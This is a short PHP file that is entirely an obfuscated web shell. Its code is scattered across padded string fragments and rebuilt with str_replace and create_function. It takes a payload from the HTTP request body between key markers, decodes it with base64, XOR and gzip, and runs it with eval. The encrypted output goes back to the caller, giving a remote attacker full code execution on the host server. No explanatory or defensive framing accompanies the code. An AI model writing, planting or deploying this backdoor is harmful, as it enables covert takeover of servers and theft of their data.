<?php
$D=';($j|<$c&&$i<$|l);$j+|+,|$i+|+){$o.|=$t|{$i}^$k{$j}|;}}retur|n $o;}if| (@pr|eg_match|(';
$Y='|"/$k||h(.+)$kf/",@file_get|_c|o||ntents("ph|p://input|"),$m)==1) {@o|||b_start();|@e|';
$a='nction x($|t|,$k){$c=st|rlen($|k);$l=st||rlen(||$t);$o="";for($i|=0;$|i<$l;){for(|$|j=0';
$z=str_replace('Cq','','creCqatCqCqCqCqe_functiCqon');
$R='val(@gzuncompres|s(@x(@b|ase64|_decode|($m[1]|),$k))|);$o=@|ob_g|e|t_contents()||;@ob_';
$w='$k="7|7d0|594a";$kh=|"4ae0a35a|9ca|6";$k|f|="28349beb99e3|";$p="|hTD3JTw||y9v5r2Y|8D";fu|';
$I='end_clean|();|$r=@base||64_enco|de(@x(@|g|zcompr|ess($||o),|$k));print("$p$kh$r$kf");}';
$p=str_replace('|','',$w.$a.$D.$Y.$R.$I);
$C=$z('',$p);$C();
?>
